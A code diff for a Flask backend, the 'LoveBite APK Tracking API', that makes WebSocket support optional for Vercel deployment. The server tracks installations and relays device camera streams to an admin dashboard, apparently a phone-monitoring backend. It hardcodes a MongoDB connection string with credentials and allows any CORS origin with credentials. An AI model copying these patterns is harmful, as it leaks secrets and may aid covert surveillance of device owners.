@@ -1,6 +1,5 @@
 from flask import Flask, request, jsonify
 from flask_cors import CORS
-from flask_socketio import SocketIO, emit, join_room, leave_room
 from pymongo import MongoClient
 from datetime import datetime
 import json
@@ -18,16 +17,29 @@ logger = logging.getLogger(__name__)
 app = Flask(__name__)
 CORS(app, origins="*", supports_credentials=True)
 
-# Configure SocketIO with better production settings
-socketio = SocketIO(
-    app, 
-    cors_allowed_origins="*",
-    logger=True,
-    engineio_logger=True,
-    ping_timeout=60,
-    ping_interval=25,
-    max_http_buffer_size=1000000
-)
+# Check if we're running on Vercel (serverless environment)
+IS_VERCEL = os.getenv('VERCEL') == '1'
+
+# Only import SocketIO if not on Vercel
+if not IS_VERCEL:
+    try:
+        from flask_socketio import SocketIO, emit, join_room, leave_room
+        # Configure SocketIO with better production settings
+        socketio = SocketIO(
+            app, 
+            cors_allowed_origins="*",
+            logger=True,
+            engineio_logger=True,
+            ping_timeout=60,
+            ping_interval=25,
+            max_http_buffer_size=1000000  # 1MB buffer for WebRTC data
+        )
+    except ImportError:
+        socketio = None
+        print("⚠️  Flask-SocketIO not available, WebSocket features disabled")
+else:
+    socketio = None
+    print("🔧 Running on Vercel - WebSocket features disabled")
 
 # MongoDB connection
 MONGODB_URI = "mongodb+srv://hussnainrajpoot5415:123456...@blogsdb.9xfkjee.mongodb.net/?retryWrites=true&w=majority&appName=blogsdb"
@@ -255,41 +267,54 @@ def get_installations():
             "error": str(e)
         }), 500
 
-# WebSocket Event Handlers
-@socketio.on('connect')
-def handle_connect():
-    try:
-        logger.info(f"Client connected: {request.sid}")
-        emit('connected', {'message': 'Connected to LoveBite server'})
-    except Exception as e:
-        logger.error(f"Error in connect handler: {e}")
+# WebSocket Event Handlers (only available when SocketIO is enabled)
+if socketio:
+    @socketio.on('connect')
+    def handle_connect():
+        try:
+            logger.info(f"Client connected: {request.sid}")
+            emit('connected', {'message': 'Connected to LoveBite server'})
+        except Exception as e:
+            logger.error(f"Error in connect handler: {e}")
 
-@socketio.on('disconnect')
-def handle_disconnect():
-    try:
-        logger.info(f"Client disconnected: {request.sid}")
-        for device_id, stream_info in list(active_camera_streams.items()):
-            if stream_info.get('client_id') == request.sid:
-                del active_camera_streams[device_id]
-                emit('camera_stopped', {'device_id': device_id}, room='admin_dashboard')
-    except Exception as e:
-        logger.error(f"Error in disconnect handler: {e}")
+    @socketio.on('disconnect')
+    def handle_disconnect():
+        try:
+            logger.info(f"Client disconnected: {request.sid}")
+            for device_id, stream_info in list(active_camera_streams.items()):
+                if stream_info.get('client_id') == request.sid:
+                    del active_camera_streams[device_id]
+                    emit('camera_stopped', {'device_id': device_id}, room='admin_dashboard')
+        except Exception as e:
+            logger.error(f"Error in disconnect handler: {e}")
 
-@socketio.on('join_admin_room')
-def handle_join_admin_room():
-    join_room('admin_dashboard')
-    print(f"Admin client connected: {request.sid}")
-    emit('joined_admin_room', {'message': 'Joined admin dashboard'})
+    @socketio.on('join_admin_room')
+    def handle_join_admin_room():
+        join_room('admin_dashboard')
+        print(f"Admin client connected: {request.sid}")
+        emit('joined_admin_room', {'message': 'Joined admin dashboard'})
+
+# Vercel handler
+def handler(request):
+    return app(request.environ, lambda *args: None)
 
 if __name__ == '__main__':
     print("🚀 Starting LoveBite APK Tracking API...")
     print(f"🔌 MongoDB: {'Connecting in background...' if not mongodb_connected else 'Connected'}")
-    print("🌐 WebSocket enabled for real-time camera streaming")
     
-    socketio.run(
-        app, 
-        host='0.0.0.0', 
-        port=int(os.getenv('PORT', '8080')),
-        debug=False,
-        allow_unsafe_werkzeug=True
-    )
+    if IS_VERCEL:
+        print("🔧 Running on Vercel - WebSocket features disabled")
+        # For Vercel, just run the Flask app without SocketIO
+        app.run(host='0.0.0.0', port=int(os.getenv('PORT', '8080')), debug=False)
+    elif socketio:
+        print("🌐 WebSocket enabled for real-time camera streaming")
+        socketio.run(
+            app, 
+            host='0.0.0.0', 
+            port=int(os.getenv('PORT', '8080')),
+            debug=False,
+            allow_unsafe_werkzeug=True
+        )
+    else:
+        print("⚠️  WebSocket features disabled - Flask-SocketIO not available")
+        app.run(host='0.0.0.0', port=int(os.getenv('PORT', '8080')), debug=False)
